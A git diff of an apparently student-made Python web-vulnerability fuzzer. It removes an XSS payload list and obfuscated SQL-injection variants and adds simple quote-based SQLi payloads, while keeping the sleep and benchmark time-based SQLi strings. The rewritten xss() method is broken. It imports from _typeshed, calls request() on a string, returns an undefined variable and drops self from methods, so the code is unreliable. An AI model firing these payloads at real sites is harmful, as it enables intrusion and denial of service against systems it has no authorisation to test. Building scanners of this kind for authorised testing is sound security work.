@@ -1,10 +1,12 @@
+from _typeshed import SupportsItemAccess
 from urllib.parse import parse_qs, unquote, urlparse, urljoin, urlencode
-from .Crawler import Crawler, DATABASE, sessions, var
+from .Crawler import Crawler, DATABASE, sessions, var, request
 from bs4 import BeautifulSoup
-from threading import Thread, ThreadError
+from threading import Thread
 from base64 import b64decode
 import tldextract
-
+import selenium 
+from urllib.error import URLError, HTTPError
 
 class Fuzzing:
     def __init__(self, URL, Page = False, db = {}, **REQUEST_INFO) -> None:
@@ -15,59 +17,76 @@ class Fuzzing:
         self.LatestURL = self.URL = URL
         REQUEST_INFO.setdefault('timeout', var.TIMEOUT)
         REQUEST_INFO.setdefault('headers', var.USER_AGENT)
-        
-        self.conn = DATABASE(host = db['HOST'], port = db['PORT'], user = db['USER'], passwd = db['PASSWORD'], db = db['DB'])
+        if db:
+            self.conn = DATABASE(host = db['HOST'], port = db['PORT'], user = db['USER'], passwd = db['PASSWORD'], db = db['DB'])
 
         self.table = tldextract.extract(URL).domain
 
         self.REQUEST_INFO = REQUEST_INFO
         self.URLJOIN = (lambda TMPURL: urljoin(self.URL, TMPURL) if TMPURL else None)
-
-        self.DB_URL()
         
+        if Page:
+            self.REQUESTS = sessions(URL, **REQUEST_INFO)
+            self.TMP_REQUEST = self.REQUESTS.webdriver()
+        else:
+            self.REQUESTS = sessions(URL, **REQUEST_INFO)
+            self.TMP_REQUEST = self.REQUESTS.sess_get()
 
-    def DB_URL(self) -> list:
+    def URL(self):
+        self.conn.URL_SELECT(TABLE_NAME=self.table)
+
+    def xss(self):
+        file = open("webfuzzing/payloads/xss/payloads.txt", "r")
+        
+        
         for i in self.conn.URL_SELECT(TABLE_NAME=self.table):
-            self.xss(i['last_url'])
+                    URL='last_url'
 
-    def xss(self, url, **REQ):
-        payloads = [
-            '<script>alert(1);</script>',
-            '"><script>alert(1);</script>',
-            '\'><script>alert(1);</script>',
-            '"><script>alert(1);</script><"',
-            '\'><script>alert(1);</script><\'',
-        ]
-        
-        assert url
+        while True:
+            pay = file.readline()
+            URL=URL.request(pay)
 
-        REQUEST = sessions(self.LatestURL, **REQ)
-        REQUEST.webdriver()
-        explurl = urlparse(url)
+            URL= request.urlopen(URL)
 
-        if explurl.query:
-            qs = parse_qs(explurl.query, keep_blank_values=True)
-            for key in qs.keys():
-                for pay in payloads:
-                    qs[key] = pay
-                    rq = REQUEST.sess_set_get(explurl._replace(query=urlencode(qs, doseq=True)).geturl())
-                    if pay in rq['body']:
-                        
-                        rs = REQUEST.DriveAlertCheck(REQUEST.url)
-                        if rs['alert']:
-                            print(f"XSS 취약점이 발생되는 URL 감지! : {REQUEST.url}")
-                            break
+            if request.method == 'GET':
+                try:
+                    exploit=request.get(URL,pay)
+                except HTTPError: 
+                    break
+            
+                if not pay:
+                    break
+            else : #request.method == 'POST':
+                try:
+                    exploit=request.post(URL,pay)
+                except HTTPError: 
+                    break
+            
+                if not pay:
+                    break
+        file.close()
 
-        REQUEST.drive.quit()
+        return URL,URL.status,parameter,pay
 
-    def openredirect(self):
+    def openredirect():
         payloads = [
             ''
         ]
 
         return payloads
 
-    def sleep_sqli(self):
+    def simple_sqli():
+        payloads = [
+            '\'',
+            '"',
+            '0',
+            '0\'',
+            '0"',
+        ]
+
+        return payloads
+
+    def sleep_sqli():
         payloads = [
             '\' or sleep(10) -- \'',
             '" or sleep(10) -- "',
@@ -81,26 +100,6 @@ class Fuzzing:
             '\' or benchmark(7380000000*10,md5(1)) #\'',
             '" or benchmark(7380000000*10,md5(1)) #"',
             '0 or benchmark(7380000000*10,md5(1)) #',
-            '\'/**/or/**/sleep(10)/**/--/**/\'',
-            '"/**/or/**/sleep(10)/**/--/**/"',
-            '0/**/or/**/sleep(10)/**/--/**/',
-            '\'/**/or/**/sleep(10)/**/#\'',
-            '"/**/or/**/sleep(10)/**/#"',
-            '0/**/or/**/sleep(10)/**/#',
-            '\'/**/or/**/benchmark(7380000000*10,md5(1))/**/--/**/\'',
-            '"/**/or/**/benchmark(7380000000*10,md5(1))/**/--/**/"',
-            '0/**/or/**/benchmark(7380000000*10,md5(1))/**/--/**/',
-            '\'/**/or/**/benchmark(7380000000*10,md5(1))/**/#\'',
-            '"/**/or/**/benchmark(7380000000*10,md5(1))/**/#"',
-            '0/**/or/**/benchmark(7380000000*10,md5(1))/**/#',
         ]
 
         return payloads
-
-# Fuzzing('http://localhost/', Page=True, db={
-#     'HOST':'localhost',
-#     'PORT':3306,
-#     'USER':'root',
-#     'PASSWORD':'autoset',
-#     'DB':'fuzzing'
-# })
